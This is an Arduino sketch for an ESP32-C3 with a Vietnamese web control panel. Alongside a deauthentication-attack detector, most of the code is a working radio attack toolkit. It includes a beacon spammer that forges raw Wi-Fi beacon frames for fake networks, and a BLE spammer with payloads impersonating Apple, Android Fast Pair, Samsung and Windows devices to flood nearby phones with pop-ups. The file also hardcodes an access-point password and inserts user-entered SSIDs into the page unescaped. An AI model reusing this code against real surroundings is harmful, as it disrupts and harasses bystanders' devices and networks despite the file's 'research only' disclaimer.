/*
 * ESP32-C3 Network Security Monitor + BLE Spam + WiFi Beacon Spam
 * Giao diện tiếng Việt
 * 
 * CẢNH BÁO: Chỉ sử dụng cho mục đích nghiên cứu và học tập
 */

#include <WiFi.h>
#include <WebServer.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEAdvertisedDevice.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_bt_device.h>

// ============================================
// PHẦN 1: CẤU HÌNH CHO ESP32-C3
// ============================================

#ifndef LED_BUILTIN
#define LED_BUILTIN 8
#endif

#define AP_SSID "Quốc Bảo"
#define AP_PASS "diemtrinh@2012"
#define MAX_NETWORKS 15
#define MAX_BEACON_SSIDS 10
#define SERIAL_OUTPUT_INTERVAL 3000

// ============================================
// PHẦN 2: DEAUTH DETECTOR
// ============================================

typedef struct {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t addr1[6];
  uint8_t addr2[6];
  uint8_t addr3[6];
  uint8_t seq_ctrl[2];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  String ssid;
  String bssid;
  int channel;
  int rssi;
} NetworkInfo;

wifi_promiscuous_filter_t filt = {
  .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

NetworkInfo networks[MAX_NETWORKS];
int networkCount = 0;
int current_channel = 6;
volatile unsigned int deauth_count = 0;
volatile unsigned long last_deauth = 0;
String web_log = "";
WebServer server(80);

// ============================================
// PHẦN 3: BEACON SPAM (WIFI ẢO)
// ============================================

String beacon_ssids[MAX_BEACON_SSIDS];
int beacon_count = 0;
bool beacon_spamming = false;
unsigned long last_beacon_spam_time = 0;
const unsigned long BEACON_SPAM_INTERVAL = 50; // ms
int beacon_channel = 1;
uint8_t beacon_bssid[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01};

// Cấu trúc gói Beacon
typedef struct {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t addr1[6];  // Destination (broadcast)
  uint8_t addr2[6];  // Source (BSSID)
  uint8_t addr3[6];  // BSSID
  uint8_t seq_ctrl[2];
  uint8_t tag[0];
} beacon_frame_t;

// ============================================
// PHẦN 4: BLE SPAM DATA
// ============================================

const uint32_t ANDROID_MODEL_IDS[] = {
    0x000047, 0x470000, 0x03F5D4, 0x8D13B9, 
    0x8D5B67, 0x989D0A, 0xC7A267,
};

constexpr size_t ANDROID_MODEL_IDS_COUNT = sizeof(ANDROID_MODEL_IDS) / sizeof(ANDROID_MODEL_IDS[0]);

const uint8_t APPLE_DEVICES[][31] = {
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

const uint8_t APPLE_SHORT_DEVICES[][23] = {
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
};

uint8_t SAMSUNG_DEVICES[] = {
  0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C
};

// BLE Globals
BLEAdvertising* advertising = nullptr;
bool ble_spamming = false;
String spamming_device = "Không";
unsigned long last_ble_spam_time = 0;
const unsigned long BLE_SPAM_INTERVAL = 150;

enum SPAM_PAYLOAD_TYPE {
    SPAM_PAYLOAD_TYPE_NONE,
    SPAM_PAYLOAD_TYPE_APPLE_DEVICE,
    SPAM_PAYLOAD_TYPE_APPLE_SHORT,
    SPAM_PAYLOAD_TYPE_ANDROID,
    SPAM_PAYLOAD_TYPE_SAMSUNG,
    SPAM_PAYLOAD_TYPE_WINDOWS,
    SPAM_PAYLOAD_TYPE_ALL,
};

String SPAM_PAYLOAD_TYPE_NAMES[] = {
    "Không", "Apple", "Apple TV", 
    "Android", "Samsung", "Windows", "Tất cả"
};

// ============================================
// PHẦN 5: DEAUTH DETECTOR FUNCTIONS
// ============================================

String formatMacAddress(const uint8_t* mac) {
  char buf[20];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

String getTimeString() {
  unsigned long seconds = millis() / 1000;
  unsigned long minutes = seconds / 60;
  unsigned long hours = minutes / 60;
  seconds %= 60;
  minutes %= 60;
  char buf[20];
  sprintf(buf, "%02lu:%02lu:%02lu", hours, minutes, seconds);
  return String(buf);
}

void wifi_sniffer_packet_handler(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_ieee80211_mac_hdr_t* hdr = (wifi_ieee80211_mac_hdr_t*)pkt->payload;

  if (type == WIFI_PKT_MGMT && pkt->payload[0] == 0x80) {
    String bssid = formatMacAddress(hdr->addr3);
    int channel = pkt->rx_ctrl.channel;
    int rssi = pkt->rx_ctrl.rssi;
    
    String ssid = "";
    uint8_t* ptr = pkt->payload + 36;
    uint8_t ssid_len = *(ptr + 1);
    if (ssid_len > 0 && ssid_len <= 32) {
      char ssid_buf[33];
      memcpy(ssid_buf, ptr + 2, ssid_len);
      ssid_buf[ssid_len] = '\0';
      ssid = String(ssid_buf);
    } else {
      ssid = "<ẩn>";
    }

    bool exists = false;
    for (int i = 0; i < networkCount; i++) {
      if (networks[i].bssid == bssid) {
        networks[i].rssi = rssi;
        networks[i].channel = channel;
        exists = true;
        break;
      }
    }
    
    if (!exists && networkCount < MAX_NETWORKS) {
      networks[networkCount++] = {ssid, bssid, channel, rssi};
    }
  }

  if (type == WIFI_PKT_MGMT && pkt->payload[0] == 0xC0) {
    deauth_count++;
    last_deauth = millis();
    
    String attacker = formatMacAddress(hdr->addr2);
    String victim = formatMacAddress(hdr->addr1);
    String entry = "[" + getTimeString() + "] TẤN CÔNG " + attacker + " -> " + victim + " (Kênh " + String(pkt->rx_ctrl.channel) + ")\n";
    web_log = entry + web_log;
    
    if (web_log.length() > 1000) {
      web_log = web_log.substring(0, 800);
    }
    
    Serial.println(entry);
  }
}

void wifi_sniffer_init() {
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
}

String generateNetworkTable() {
  String table = "";
  for (int i = 0; i < networkCount; i++) {
    int signalWidth = map(networks[i].rssi, -100, -50, 0, 100);
    signalWidth = constrain(signalWidth, 0, 100);
    
    table += "<tr>";
    table += "<td>" + networks[i].ssid + "</td>";
    table += "<td>" + networks[i].bssid + "</td>";
    table += "<td>" + String(networks[i].channel) + "</td>";
    table += "<td><div class='signal'><div class='signal-bar'><div class='signal-level' style='width:" + String(signalWidth) + "%;'></div></div>" + String(networks[i].rssi) + " dBm</div></td>";
    table += "</tr>";
  }
  return table;
}

// ============================================
// PHẦN 6: BEACON SPAM FUNCTIONS
// ============================================

void addBeaconSSID(String ssid) {
  if (beacon_count < MAX_BEACON_SSIDS) {
    beacon_ssids[beacon_count++] = ssid;
    Serial.println("Đã thêm WiFi ảo: " + ssid);
  } else {
    Serial.println("Đã đạt giới hạn " + String(MAX_BEACON_SSIDS) + " WiFi ảo!");
  }
}

void clearBeaconSSIDs() {
  beacon_count = 0;
  Serial.println("Đã xóa tất cả WiFi ảo!");
}

void sendBeaconFrame(String ssid, int channel, uint8_t* bssid) {
  // Tạo BSSID ngẫu nhiên nếu chưa có
  if (bssid == NULL) {
    uint8_t random_bssid[6];
    for (int i = 0; i < 6; i++) {
      random_bssid[i] = random(256);
    }
    random_bssid[0] |= 0x02; // Local administered
    bssid = random_bssid;
  }
  
  // Chuyển kênh
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  
  // Tạo gói Beacon
  uint8_t beacon_frame[200];
  int pos = 0;
  
  // Frame Control
  beacon_frame[pos++] = 0x80; // Type: Management, Subtype: Beacon
  beacon_frame[pos++] = 0x00;
  
  // Duration
  beacon_frame[pos++] = 0x00;
  beacon_frame[pos++] = 0x00;
  
  // Destination (Broadcast)
  for (int i = 0; i < 6; i++) beacon_frame[pos++] = 0xFF;
  
  // Source (BSSID)
  for (int i = 0; i < 6; i++) beacon_frame[pos++] = bssid[i];
  
  // BSSID
  for (int i = 0; i < 6; i++) beacon_frame[pos++] = bssid[i];
  
  // Sequence Control
  beacon_frame[pos++] = 0x00;
  beacon_frame[pos++] = 0x00;
  
  // Timestamp (8 bytes, 0)
  for (int i = 0; i < 8; i++) beacon_frame[pos++] = 0x00;
  
  // Beacon Interval (100 TU = 102.4ms)
  beacon_frame[pos++] = 0x64;
  beacon_frame[pos++] = 0x00;
  
  // Capability Info (ESS)
  beacon_frame[pos++] = 0x01;
  beacon_frame[pos++] = 0x00;
  
  // SSID Tag
  beacon_frame[pos++] = 0x00; // Tag: SSID
  beacon_frame[pos++] = ssid.length(); // Length
  for (int i = 0; i < ssid.length(); i++) {
    beacon_frame[pos++] = ssid[i];
  }
  
  // Supported Rates (1, 2, 5.5, 11, 18, 24, 36, 54)
  beacon_frame[pos++] = 0x01; // Tag: Supported Rates
  beacon_frame[pos++] = 0x08; // Length
  beacon_frame[pos++] = 0x82;
  beacon_frame[pos++] = 0x84;
  beacon_frame[pos++] = 0x8B;
  beacon_frame[pos++] = 0x96;
  beacon_frame[pos++] = 0x24;
  beacon_frame[pos++] = 0x30;
  beacon_frame[pos++] = 0x48;
  beacon_frame[pos++] = 0x6C;
  
  // DS Parameter (Channel)
  beacon_frame[pos++] = 0x03; // Tag: DS Parameter
  beacon_frame[pos++] = 0x01; // Length
  beacon_frame[pos++] = channel;
  
  // Gửi gói tin
  esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, pos, false);
}

void startBeaconSpam() {
  if (beacon_count == 0) {
    Serial.println("⚠️ Chưa có WiFi ảo nào! Thêm tên WiFi trước khi bắt đầu.");
    return;
  }
  
  if (beacon_spamming) {
    return;
  }
  
  // Tạm dừng sniffing
  esp_wifi_set_promiscuous(false);
  delay(50);
  
  beacon_spamming = true;
  last_beacon_spam_time = 0;
  
  Serial.println("Đã bắt đầu spam WiFi ảo!");
  web_log = "[" + getTimeString() + "] BẮT ĐẦU SPAM " + String(beacon_count) + " WiFi ảo!\n" + web_log;
}

void stopBeaconSpam() {
  if (!beacon_spamming) return;
  
  beacon_spamming = false;
  
  // Resume sniffing
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
  esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
  
  Serial.println("Đã dừng spam WiFi ảo!");
  web_log = "[" + getTimeString() + "] DỪNG SPAM WiFi ảo\n" + web_log;
}

void BeaconSpamLoop() {
  if (!beacon_spamming) return;
  
  if (millis() - last_beacon_spam_time < BEACON_SPAM_INTERVAL) {
    return;
  }
  last_beacon_spam_time = millis();
  
  static int current_beacon = 0;
  
  // Tạo BSSID ngẫu nhiên cho mỗi beacon
  uint8_t random_bssid[6];
  for (int i = 0; i < 6; i++) {
    random_bssid[i] = random(256);
  }
  random_bssid[0] |= 0x02;
  
  // Gửi beacon với kênh ngẫu nhiên (1-11)
  int random_channel = random(1, 12);
  sendBeaconFrame(beacon_ssids[current_beacon], random_channel, random_bssid);
  
  current_beacon = (current_beacon + 1) % beacon_count;
}

// ============================================
// PHẦN 7: BLE SPAM FUNCTIONS
// ============================================

void BLE_Init() {
  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  
  BLEServer *pServer = BLEDevice::createServer();
  advertising = pServer->getAdvertising();
}

void BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE type) {
  uint8_t dummy_addr[6];
  for (int i = 0; i < 6; i++) {
    dummy_addr[i] = random(256);
    if (i == 0) {
      dummy_addr[i] |= 0xC0;
    }
  }
  
  BLEAddress addr(dummy_addr);
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
  
  if (type == SPAM_PAYLOAD_TYPE_APPLE_DEVICE) {
    int index = random(sizeof(APPLE_DEVICES) / sizeof(APPLE_DEVICES[0]));
    oAdvertisementData.addData((char*)APPLE_DEVICES[index], 31);
    spamming_device = "Apple";
  }
  else if (type == SPAM_PAYLOAD_TYPE_APPLE_SHORT) {
    int index = random(sizeof(APPLE_SHORT_DEVICES) / sizeof(APPLE_SHORT_DEVICES[0]));
    oAdvertisementData.addData((char*)APPLE_SHORT_DEVICES[index], 23);
    spamming_device = "Apple TV";
  }
  else if (type == SPAM_PAYLOAD_TYPE_ANDROID) {
    uint32_t model_id = ANDROID_MODEL_IDS[random(ANDROID_MODEL_IDS_COUNT)];
    
    uint8_t data[31];
    int i = 0;
    data[i++] = 3;
    data[i++] = 0x03;
    data[i++] = 0x2C;
    data[i++] = 0xFE;
    
    data[i++] = 6;
    data[i++] = 0x16;
    data[i++] = 0x2C;
    data[i++] = 0xFE;
    data[i++] = (uint8_t)((model_id >> 16) & 0xFF);
    data[i++] = (uint8_t)((model_id >> 8) & 0xFF);
    data[i++] = (uint8_t)(model_id & 0xFF);
    
    data[i++] = 2;
    data[i++] = 0x0A;
    data[i++] = (uint8_t)((rand() % 120) - 100);
    
    oAdvertisementData.addData((char*)data, 14);
    spamming_device = "Android";
  }
  else if (type == SPAM_PAYLOAD_TYPE_SAMSUNG) {
    uint8_t data[15];
    int i = 0;
    
    uint8_t model = SAMSUNG_DEVICES[random(sizeof(SAMSUNG_DEVICES))];
    
    data[i++] = 14;
    data[i++] = 0xFF;
    data[i++] = 0x75;
    data[i++] = 0x00;
    data[i++] = 0x01;
    data[i++] = 0x00;
    data[i++] = 0x02;
    data[i++] = 0x00;
    data[i++] = 0x01;
    data[i++] = 0x01;
    data[i++] = 0xFF;
    data[i++] = 0x00;
    data[i++] = 0x00;
    data[i++] = 0x43;
    data[i++] = (model >> 0x00) & 0xFF;
    
    oAdvertisementData.addData((char*)data, 15);
    spamming_device = "Samsung";
  }
  else if (type == SPAM_PAYLOAD_TYPE_WINDOWS) {
    const char* Name = "Win11";
    uint8_t name_len = strlen(Name);
    uint8_t data[7 + name_len];
    int i = 0;
    
    data[i++] = 7 + name_len - 1;
    data[i++] = 0xFF;
    data[i++] = 0x06;
    data[i++] = 0x00;
    data[i++] = 0x03;
    data[i++] = 0x00;
    data[i++] = 0x80;
    memcpy(&data[i], Name, name_len);
    i += name_len;
    
    oAdvertisementData.addData((char*)data, 7 + name_len);
    spamming_device = "Windows";
  }
  else if (type == SPAM_PAYLOAD_TYPE_ALL) {
    spamming_device = "Tất cả";
  }

  advertising->setAdvertisementData(oAdvertisementData);
  advertising->setMinInterval(0x20);
  advertising->setMaxInterval(0x20);
  
  advertising->start();
  delay(80);
  advertising->stop();
}

void BLE_SpamLoop() {
  if (!ble_spamming) return;
  
  static int num = 0;
  static SPAM_PAYLOAD_TYPE current_type = SPAM_PAYLOAD_TYPE_ALL;
  
  if (millis() - last_ble_spam_time < BLE_SPAM_INTERVAL) {
    return;
  }
  last_ble_spam_time = millis();
  
  if (current_type == SPAM_PAYLOAD_TYPE_ALL) {
    BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE_APPLE_DEVICE);
    BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE_APPLE_SHORT);
    BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE_ANDROID);
    BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE_SAMSUNG);
    BLE_SpamSendPayload(SPAM_PAYLOAD_TYPE_WINDOWS);
    spamming_device = "Tất cả";
    num += 5;
  } else {
    BLE_SpamSendPayload(current_type);
    num++;
  }
}

void startBLE_Spam(SPAM_PAYLOAD_TYPE type) {
  if (ble_spamming) {
    return;
  }
  
  // Nếu đang spam WiFi ảo, dừng trước
  if (beacon_spamming) {
    stopBeaconSpam();
  }
  
  esp_wifi_set_promiscuous(false);
  delay(50);
  
  BLE_Init();
  ble_spamming = true;
  spamming_device = "Đang chạy";
  last_ble_spam_time = 0;
  
  Serial.println("BLE Spamming đã bắt đầu!");
}

void stopBLE_Spam() {
  if (!ble_spamming) return;
  
  ble_spamming = false;
  
  if (advertising) {
    advertising->stop();
  }
  
  BLEDevice::deinit(true);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
  
  Serial.println("BLE Spamming đã dừng!");
}

// ============================================
// PHẦN 8: WEB SERVER HANDLERS (GIAO DIỆN TIẾNG VIỆT)
// ============================================

void handleRoot() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="UTF-8">
  <title>ESP32-C3 - Giám sát & Spam</title>
  <style>
    :root { --dark: #0f0f12; --darker: #09090c; --accent: #6a0dad; --neon: #9d4edd; --text: #e0e0e0; --alert: #d32f2f; --success: #2e7d32; --warning: #f57c00; }
    * { box-sizing: border-box; }
    body { font-family: 'Segoe UI', sans-serif; background: var(--dark); color: var(--text); margin: 0; padding: 10px; }
    .container { max-width: 750px; margin: 0 auto; background: var(--darker); border-radius: 8px; padding: 15px; border: 1px solid #2a2a35; }
    h1 { color: var(--neon); text-align: center; font-size: 20px; margin: 10px 0; }
    h2 { color: var(--neon); font-size: 16px; margin: 10px 0 5px 0; }
    .alert { background: var(--alert); color: white; padding: 10px; border-radius: 6px; margin: 10px 0; text-align: center; animation: pulse 2s infinite; font-weight: bold; }
    .info { background: var(--success); color: white; padding: 10px; border-radius: 6px; margin: 10px 0; text-align: center; }
    .warning { background: var(--warning); color: white; padding: 10px; border-radius: 6px; margin: 10px 0; text-align: center; }
    @keyframes pulse { 0% { opacity: 0.8; } 50% { opacity: 1; } 100% { opacity: 0.8; } }
    .control-panel { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; background: rgba(20,20,30,0.7); padding: 10px; border-radius: 6px; }
    .control-panel input { padding: 8px 12px; border-radius: 4px; font-size: 13px; background: #1a1a25; color: var(--text); border: 1px solid #3a3a45; flex: 1; min-width: 100px; }
    select, button { padding: 8px 12px; border-radius: 4px; font-size: 13px; }
    select { background: #1a1a25; color: var(--text); border: 1px solid #3a3a45; flex: 1; min-width: 80px; }
    button { background: var(--accent); color: white; border: none; cursor: pointer; transition: all 0.3s; min-width: 80px; font-weight: bold; }
    button:hover { background: var(--neon); }
    button.start-btn { background: #2e7d32; }
    button.start-btn:hover { background: #43a047; }
    button.stop-btn { background: #c62828; }
    button.stop-btn:hover { background: #d32f2f; }
    button.add-btn { background: #1565C0; }
    button.add-btn:hover { background: #1976D2; }
    button.clear-btn { background: #E65100; }
    button.clear-btn:hover { background: #F57C00; }
    .ssid-list { display: flex; flex-wrap: wrap; gap: 5px; margin: 5px 0; }
    .ssid-tag { background: #1a1a25; padding: 4px 10px; border-radius: 12px; border: 1px solid var(--accent); font-size: 12px; display: inline-block; }
    .network-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
    .network-table th { background: #1a1a25; color: var(--neon); padding: 8px; text-align: left; }
    .network-table td { padding: 8px; border-bottom: 1px solid #2a2a35; }
    .signal-bar { height: 8px; background: #333; border-radius: 4px; overflow: hidden; flex: 1; }
    .signal-level { height: 100%; background: linear-gradient(90deg, #ff3e3e, #f7d060, #6aef5e); }
    .status { display: flex; flex-wrap: wrap; justify-content: space-between; margin-top: 10px; font-size: 12px; color: #aaa; gap: 5px; }
    .log { background: rgba(10,10,10,0.8); padding: 10px; border-radius: 6px; margin-top: 10px; max-height: 150px; overflow-y: auto; font-family: monospace; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
    .footer { text-align: center; margin-top: 10px; font-size: 11px; color: #666; }
    .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: bold; }
    .badge-active { background: #2e7d32; color: white; }
    .badge-inactive { background: #555; color: #aaa; }
    .badge-wifi { background: #1565C0; color: white; }
    .badge-ble { background: #6a0dad; color: white; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔒 ESP32-C3 - Giám sát & Spam</h1>
    
    %DEAUTH_ALERT%
    %BEACON_ALERT%
    %BLE_ALERT%
    
    <!-- Phần WiFi ảo -->
    <h2>📶 WiFi ảo (Beacon Spam)</h2>
    <div class="control-panel">
      <input type="text" id="ssidInput" placeholder="Nhập tên WiFi ảo..." maxlength="32">
      <button class="add-btn" onclick="addSSID()">+ Thêm</button>
      <button class="clear-btn" onclick="clearSSID()">✖ Xóa hết</button>
    </div>
    <div class="control-panel">
      <div style="flex:1; font-size:13px; color:#aaa;">Danh sách WiFi ảo:</div>
      <div class="ssid-list" id="ssidList">%SSID_LIST%</div>
    </div>
    <div class="control-panel">
      <button class="start-btn" onclick="startBeacon()">▶ Bắt đầu WiFi ảo</button>
      <button class="stop-btn" onclick="stopBeacon()">■ Dừng WiFi ảo</button>
      <span style="font-size:13px; color:#aaa; margin-left:10px;">Trạng thái: <span id="beaconStatus">%BEACON_STATUS%</span></span>
    </div>
    
    <!-- Phần BLE Spam -->
    <h2>📡 BLE Spam</h2>
    <div class="control-panel">
      <select id="spamType">
        <option value="all">Tất cả</option>
        <option value="apple">Apple (AirPods)</option>
        <option value="apple_short">Apple TV</option>
        <option value="android">Android</option>
        <option value="samsung">Samsung</option>
        <option value="windows">Windows</option>
      </select>
      <button class="start-btn" onclick="startBLE()">▶ Bắt đầu BLE</button>
      <button class="stop-btn" onclick="stopBLE()">■ Dừng BLE</button>
    </div>
    
    <!-- Phần quét mạng -->
    <h2>📋 Mạng WiFi phát hiện</h2>
    <div class="control-panel">
      <select id="channel">
        <option value="1">Kênh 1</option><option value="2">Kênh 2</option><option value="3">Kênh 3</option>
        <option value="4">Kênh 4</option><option value="5">Kênh 5</option><option value="6">Kênh 6</option>
        <option value="7">Kênh 7</option><option value="8">Kênh 8</option><option value="9">Kênh 9</option>
        <option value="10">Kênh 10</option><option value="11">Kênh 11</option>
      </select>
      <button onclick="changeChannel()">Đặt kênh</button>
      <button onclick="location.reload()">🔄 Làm mới</button>
    </div>
    
    <table class="network-table">
      <thead><tr><th>Tên WiFi</th><th>MAC</th><th>Kênh</th><th>Cường độ</th></tr></thead>
      <tbody>%NETWORK_DATA%</tbody>
    </table>
    
    <div class="log">%LOG%</div>
    
    <div class="status">
      <div>⚡ Tấn công: <span style="color: #ff6b6b; font-weight: bold;">%DEAUTH_COUNT%</span></div>
      <div>📶 WiFi ảo: <span>%BEACON_STATUS%</span></div>
      <div>📡 BLE: <span id="bleStatus">%BLE_STATUS%</span></div>
      <div>📻 Kênh: <span>%CURRENT_CHANNEL%</span></div>
    </div>
    
    <div class="footer">⚠️ Chỉ sử dụng cho mục đích nghiên cứu và học tập</div>
  </div>

  <script>
    document.getElementById('channel').value = '%CURRENT_CHANNEL%';
    
    function addSSID() {
      const input = document.getElementById('ssidInput');
      const ssid = input.value.trim();
      if (ssid.length > 0) {
        fetch('/addssid?ssid=' + encodeURIComponent(ssid))
          .then(r => { if(r.ok) { input.value = ''; location.reload(); } });
      }
    }
    
    function clearSSID() {
      if (confirm('Xóa tất cả WiFi ảo?')) {
        fetch('/clearssid').then(r => { if(r.ok) location.reload(); });
      }
    }
    
    function startBeacon() {
      fetch('/startbeacon').then(r => { if(r.ok) location.reload(); });
    }
    
    function stopBeacon() {
      fetch('/stopbeacon').then(r => { if(r.ok) location.reload(); });
    }
    
    function startBLE() {
      const type = document.getElementById('spamType').value;
      fetch('/startble?type=' + type).then(r => { if(r.ok) location.reload(); });
    }
    
    function stopBLE() {
      fetch('/stopble').then(r => { if(r.ok) location.reload(); });
    }
    
    function changeChannel() {
      const channel = document.getElementById('channel').value;
      fetch('/setchannel?channel=' + channel).then(r => { if(r.ok) location.reload(); });
    }
    
    setTimeout(() => { location.reload(); }, 5000);
  </script>
</body>
</html>
  )rawliteral";

  // Tạo danh sách SSID
  String ssid_list = "";
  for (int i = 0; i < beacon_count; i++) {
    ssid_list += "<span class='ssid-tag'>" + beacon_ssids[i] + "</span>";
  }
  if (beacon_count == 0) {
    ssid_list = "<span style='color:#666; font-size:12px;'>Chưa có WiFi ảo nào</span>";
  }
  
  String deauth_alert = "";
  if (millis() - last_deauth < 5000) {
    deauth_alert = "<div class='alert'>🚨 PHÁT HIỆN TẤN CÔNG DEAUTH!</div>";
  }
  
  String beacon_alert = "";
  if (beacon_spamming) {
    beacon_alert = "<div class='info'>📶 Đang spam " + String(beacon_count) + " WiFi ảo</div>";
  }
  
  String ble_alert = "";
  if (ble_spamming) {
    ble_alert = "<div class='info'>📡 Đang spam BLE: <strong>" + spamming_device + "</strong></div>";
  }
  
  String beacon_status = beacon_spamming ? "<span class='badge badge-wifi'>Đang chạy</span>" : "<span class='badge badge-inactive'>Đã dừng</span>";
  String ble_status = ble_spamming ? "<span class='badge badge-ble'>Đang chạy</span>" : "<span class='badge badge-inactive'>Đã dừng</span>";
  
  html.replace("%DEAUTH_ALERT%", deauth_alert);
  html.replace("%BEACON_ALERT%", beacon_alert);
  html.replace("%BLE_ALERT%", ble_alert);
  html.replace("%DEAUTH_COUNT%", String(deauth_count));
  html.replace("%CURRENT_CHANNEL%", String(current_channel));
  html.replace("%BLE_STATUS%", ble_status);
  html.replace("%BEACON_STATUS%", beacon_status);
  html.replace("%SSID_LIST%", ssid_list);
  html.replace("%NETWORK_DATA%", networkCount > 0 ? generateNetworkTable() : "<tr><td colspan='4'>🔄 Đang quét mạng...</td></tr>");
  html.replace("%LOG%", web_log.length() > 0 ? web_log : "📋 Chưa có sự kiện bảo mật nào");
  
  server.send(200, "text/html", html);
}

// ============================================
// PHẦN 9: WEB HANDLERS CHO BEACON SPAM
// ============================================

void handleAddSSID() {
  if (server.hasArg("ssid")) {
    String ssid = server.arg("ssid");
    ssid.trim();
    if (ssid.length() > 0 && ssid.length() <= 32) {
      addBeaconSSID(ssid);
      server.send(200, "text/plain", "OK");
    } else {
      server.send(400, "text/plain", "Tên WiFi phải từ 1-32 ký tự");
    }
  }
}

void handleClearSSID() {
  clearBeaconSSIDs();
  server.send(200, "text/plain", "OK");
}

void handleStartBeacon() {
  if (beacon_count > 0) {
    // Nếu đang spam BLE, dừng trước
    if (ble_spamming) {
      stopBLE_Spam();
    }
    startBeaconSpam();
    server.send(200, "text/plain", "OK");
  } else {
    server.send(400, "text/plain", "Chưa có WiFi ảo nào!");
  }
}

void handleStopBeacon() {
  stopBeaconSpam();
  server.send(200, "text/plain", "OK");
}

void handleStartBLE() {
  if (server.hasArg("type")) {
    String type = server.arg("type");
    SPAM_PAYLOAD_TYPE spam_type = SPAM_PAYLOAD_TYPE_ALL;
    
    if (type == "apple") spam_type = SPAM_PAYLOAD_TYPE_APPLE_DEVICE;
    else if (type == "apple_short") spam_type = SPAM_PAYLOAD_TYPE_APPLE_SHORT;
    else if (type == "android") spam_type = SPAM_PAYLOAD_TYPE_ANDROID;
    else if (type == "samsung") spam_type = SPAM_PAYLOAD_TYPE_SAMSUNG;
    else if (type == "windows") spam_type = SPAM_PAYLOAD_TYPE_WINDOWS;
    else spam_type = SPAM_PAYLOAD_TYPE_ALL;
    
    // Nếu đang spam WiFi ảo, dừng trước
    if (beacon_spamming) {
      stopBeaconSpam();
    }
    
    startBLE_Spam(spam_type);
    server.send(200, "text/plain", "OK");
  }
}

void handleStopBLE() {
  stopBLE_Spam();
  server.send(200, "text/plain", "OK");
}

void handleSetChannel() {
  if (server.hasArg("channel")) {
    current_channel = server.arg("channel").toInt();
    esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
    networkCount = 0;
    server.send(200, "text/plain", "OK");
  }
}

